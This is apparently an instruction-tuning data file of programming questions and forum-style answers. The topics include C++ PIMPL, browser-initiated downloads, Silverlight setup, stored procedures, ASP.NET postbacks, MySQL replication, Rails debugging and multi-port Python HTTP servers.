{"instruction": "Backgrounder:\nThe PIMPL Idiom (Pointer to IMPLementation) is a technique for implementation hiding in which a public class wraps a structure or class that cannot be seen outside the library the public class is part of.\nThis hides internal implementation details and data from the user of the library.\nWhen implementing this idiom why would you place the public methods on the pimpl class and not the public class since the public classes method implementations would be compiled into the library and the user only has the header file?\nTo illustrate, this code puts the Purr() implementation on the impl class and wraps it as well.\nWhy not implement Purr directly on the public class?\n// header file:\nclass Cat {\n    private:\n        class CatImpl;  // Not defined here\n        CatImpl *cat_;  // Handle\n\n    public:\n        Cat();            // Constructor\n        ~Cat();           // Destructor\n        // Other operations...\n        Purr();\n};\n\n\n// CPP file:\n#include \"cat.h\"\n\nclass Cat::CatImpl {\n    Purr();\n...     // The actual implementation can be anything\n};\n\nCat::Cat() {\n    cat_ = new CatImpl;\n}\n\nCat::~Cat() {\n    delete cat_;\n}\n\nCat::Purr(){ cat_->Purr(); }\nCatImpl::Purr(){\n   printf(\"purrrrrr\");\n}", "output": "I don't know if this is a difference worth mentioning but...\nWould it be possible to have the implementation in its own namespace and have a public wrapper / library namespace for the code the user sees:\ncatlib::Cat::Purr(){ cat_->Purr(); }\ncat::Cat::Purr(){\n   printf(\"purrrrrr\");\n}\n\nThis way all library code can make use of the cat namespace and as the need to expose a class to the user arises a wrapper could be created in the catlib namespace."}
{"instruction": "On a PHP-based web site, I want to send users a download package after they have filled out a short form. The site-initiated download should be similar to sites like download.com, which say \"your download will begin in a moment.\"\nA couple of possible approaches I know about, and browser compatibility (based on a quick test):\n1) Do a window.open pointing to the new file. \n- FireFox 3 blocks this.  \n - IE6 blocks this.  \n - IE7 blocks this.\n\n2) Create an iframe pointing to the new file. \n- FireFox 3 seems to think this is OK. (Maybe it's because I already accepted it once?)  \n - IE6 blocks this.  \n - IE7 blocks this.\n\nHow can I do this so that at least these three browsers will not object? \n\nBonus: is there a method that doesn't require browser-conditional statements? \n(I believe that download.com employs both methods conditionally, but I can't get either one to work.)\nResponses and Clarifications:\nQ: \"Why not point the current window to the file?\"  \nA: That might work, but in this particular case, I want to show them some other content while their download starts - for example, \"would you like to donate to this project?\"\n\nUPDATE: I have abandoned this approach. See my answer below for reasons.", "output": "I've always just made an iframe which points to the file.\n<iframe src=\"/download.exe\" frameborder=\"0\" height=\"0\" width=\"0\"><a href=\"/download.exe\">Click here to download.</a></iframe>"}
{"instruction": "How does one start development in Silverlight?\nDoes one need a new IDE? or Visual studio will support?", "output": "Yes there is tooling support for Visual Studio. It is still in Beta though.\nGet Started Building Silverlight 2 Applications\n1) Install Visual Studio 2008 then Install Silverlight Tools Beta 2 for Visual Studio 2008\nThis add-on to Visual Studio 2008 allows you to use .NET to create Silverlight 2 Beta 2 Web sites. The Silverlight 2 Beta 2 Runtime and the Silverlight 2 Beta 2 SDK are installed as part of this install. For additional information read the overview and the Silverlight 2 Beta 2 Readme Notes. Note if you have Visual Studio 2008 Service Pack 1 Beta installed, please see this information for details on installing correctly. \n2) Install Expression Blend 2.5 June 2008 Preview\nThis is a preview version of Expression Blend for designing Silverlight 2 experiences. \n3) Install Deep Zoom Composer\nThis tool allows you to prepare your images for use with the Deep Zoom feature in Silverlight 2. \nOne thing to watch out for is that Silverlight does not support Synchronous calls to the server. All calls are Asynchronous as of this Beta."}
{"instruction": "Conventional wisdom states that stored procedures are always faster. So, since they're always faster, use them ALL THE TIME.\nI am pretty sure this is grounded in some historical context where this was once the case. Now, I'm not advocating that Stored Procs are not needed, but I want to know in what cases stored procs are necessary in modern databases such as MySql, SqlServer, Oracle, or . Is it overkill to have ALL access through stored procs?", "output": "IMHO...\nRestricting \"C_UD\" operations to stored procedures can keep the data integrity logic in one place. This can also be done by restricting\"C_UD\" operations to a single middle ware layer.\nRead operations can be provided to the application so they can join only the tables / columns they need."}
{"instruction": "Is it possible to to programmatically trigger a postback from server code in ASP.NET?  I know that it is possible to do a Response.Redirect or Server.Transfer to redirect to a page, but is there a way to trigger a postback to the same page in server code (i.e. without using javascript trickery to submit a form)?", "output": "You could do it with an Ajax request.  You'd have to have the page polling the server.  There isn't any way for the server to push information out to the browser without requesting it.  But having some Javascript that runs in the background and polls the server every 5 seconds (or more, depending on your needs) would probably be the best solution.\nAPPEND\nIf you go this route, you can have the server send back just a yes or no, or even just 0 or 1 depending on whether or not the postback should be performed.  Depending on your needs, there many be no reason to actually use the XML part of AJAX.  Just run a simple Asynchronous request, possibly with a few querystring variables, and get back a simple one word, or even a number as a response. That way you can keep the javascript for creating and parsing the XML out if it isn't needed."}
{"instruction": "Is it possible to to programmatically trigger a postback from server code in ASP.NET?  I know that it is possible to do a Response.Redirect or Server.Transfer to redirect to a page, but is there a way to trigger a postback to the same page in server code (i.e. without using javascript trickery to submit a form)?", "output": "Asp.net Postbacks are initiated from the client (typically form submission). I am not sure what you are trying to achieve. Some of the server side page lifecyle events are already executed and what you are trying to do is raise the previous event handlers again."}
{"instruction": "Is it possible to to programmatically trigger a postback from server code in ASP.NET?  I know that it is possible to do a Response.Redirect or Server.Transfer to redirect to a page, but is there a way to trigger a postback to the same page in server code (i.e. without using javascript trickery to submit a form)?", "output": "Postbacks are caused by a FORM submission. You need to initiate them from the client."}
{"instruction": "How does one start development in Silverlight?\nDoes one need a new IDE? or Visual studio will support?", "output": "Dan Wahlin has some good Silverlight 2 videos at:\nhttp://weblogs.asp.net/dwahlin/archive/2008/03/07/silverlight-2-0-video-tutorials.aspx\nThey are quite helpful.\nrp"}
{"instruction": "I'm running a master-slave MySQL binary log replication system (phew!) that, for some data, is not in sync (meaning, the master holds more data than the slave). But the slave stops very frequently on the slightest MySQL error, can this be disabled? (perhaps a my.cnf setting for the replicating slave ignore-replicating-errors or some of the sort ;) )\nThis is what happens, every now and then, when the slave tries to replicate an item that does not exist, the slave just dies. a quick check at SHOW SLAVE STATUS \\G; gives\n       Slave-IO-Running: Yes\n      Slave-SQL-Running: No\n        Replicate-Do-DB: \n             Last-Errno: 1062\n             Last-Error: Error 'Duplicate entry '15218' for key 1' on query. Default database: 'db'. Query: 'INSERT INTO db.table ( FIELDS ) VALUES ( VALUES )'\n\nwhich I promptly fix (once I realize that the slave has been stopped) by doing the following:\nSTOP SLAVE;\nRESET SLAVE;\nSTART SLAVE;\n\n... lately this has been getting kind of tiresome, and before I spit out some sort of PHP which does this for me, i was wondering if there's some my.cnf entry which will not kill the slave on the first error.\nCheers,\n/mp", "output": "If the slave isn't used for any writes other than the replication, the authors of High Performance MySQL recommend adding read_only on the slave server to prevent users from mistakenly changing data on the slave as this is will also create the same errors you experienced."}
{"instruction": "What is the best way for me to determine a controller variable's value during execution?\nFor example, is there a way I can insert a break in the code, and cause the value of the variable to be output to the screen (or the log)?", "output": "Yes. The easiest way is to raise the value as a string. Like so: raise @foo.to_s\nOr, you can install the debugger (gem install ruby-debug), and then start the development server with the --debugger flag. Then, in your code, call the debugger instruction.\nInside the debugger prompt, you have many commands, including p to print the value of a variable.\nUpdate: here's a bit more about ruby-debug."}
{"instruction": "What is the best way for me to determine a controller variable's value during execution?\nFor example, is there a way I can insert a break in the code, and cause the value of the variable to be output to the screen (or the log)?", "output": "If you have a controller instance variable named @foo, then in your controller you can simply do something like:\nlogger.debug \"@foo is: #{@foo}\"\n\nAdditionally, you can output the value in your view template using:\n<%= debug @foo %>"}
{"instruction": "What is the best way for me to determine a controller variable's value during execution?\nFor example, is there a way I can insert a break in the code, and cause the value of the variable to be output to the screen (or the log)?", "output": "I prefer using the inspect method like so:\nraise @foo.inspect\n\nIt has more information than to_s, like the attribute values."}
{"instruction": "Is there an IE6/PNG fix that is officially developed by the jQuery team?\nIf not which of the available plugins should I use?", "output": "Check this out. Some people mention jQuery plugins in the comments as well.\nPNG Fix from 24 Ways"}
{"instruction": "I'm writing a small web server in Python, using BaseHTTPServer and a custom subclass of BaseHTTPServer.BaseHTTPRequestHandler. Is it possible to make this listen on more than one port?\nWhat I'm doing now:\nclass MyRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):\n  def doGET\n  [...]\n\nclass ThreadingHTTPServer(ThreadingMixIn, HTTPServer): \n    pass\n\nserver = ThreadingHTTPServer(('localhost', 80), MyRequestHandler)\nserver.serve_forever()", "output": "Sure; just start two different servers on two different ports in two different threads that each use the same handler.  Here's a complete, working example that I just wrote and tested.  If you run this code then you'll be able to get a Hello World webpage at both http://localhost:1111/ and http://localhost:2222/\nfrom threading import Thread\nfrom SocketServer import ThreadingMixIn\nfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/plain\")\n        self.end_headers()\n        self.wfile.write(\"Hello World!\")\n\nclass ThreadingHTTPServer(ThreadingMixIn, HTTPServer):\n    pass\n\ndef serve_on_port(port):\n    server = ThreadingHTTPServer((\"localhost\",port), Handler)\n    server.serve_forever()\n\nThread(target=serve_on_port, args=[1111]).start()\nserve_on_port(2222)"}
{"instruction": "I'm writing a small web server in Python, using BaseHTTPServer and a custom subclass of BaseHTTPServer.BaseHTTPRequestHandler. Is it possible to make this listen on more than one port?\nWhat I'm doing now:\nclass MyRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):\n  def doGET\n  [...]\n\nclass ThreadingHTTPServer(ThreadingMixIn, HTTPServer): \n    pass\n\nserver = ThreadingHTTPServer(('localhost', 80), MyRequestHandler)\nserver.serve_forever()", "output": "Not easily. You could have two ThreadingHTTPServer instances, write your own serve_forever() function (don't worry it's not a complicated function).\nThe existing function:\ndef serve_forever(self, poll_interval=0.5):\n    \"\"\"Handle one request at a time until shutdown.\n\n    Polls for shutdown every poll_interval seconds. Ignores\n    self.timeout. If you need to do periodic tasks, do them in\n    another thread.\n    \"\"\"\n    self.__serving = True\n    self.__is_shut_down.clear()\n    while self.__serving:\n        # XXX: Consider using another file descriptor or\n        # connecting to the socket to wake this up instead of\n        # polling. Polling reduces our responsiveness to a\n        # shutdown request and wastes cpu at all other times.\n        r, w, e = select.select([self], [], [], poll_interval)\n        if r:\n            self._handle_request_noblock()\n    self.__is_shut_down.set()\n\nSo our replacement would be something like:\ndef serve_forever(server1,server2):\n    while True:\n        r,w,e = select.select([server1,server2],[],[],0)\n        if server1 in r:\n            server1.handle_request()\n        if server2 in r:\n            server2.handle_request()"}
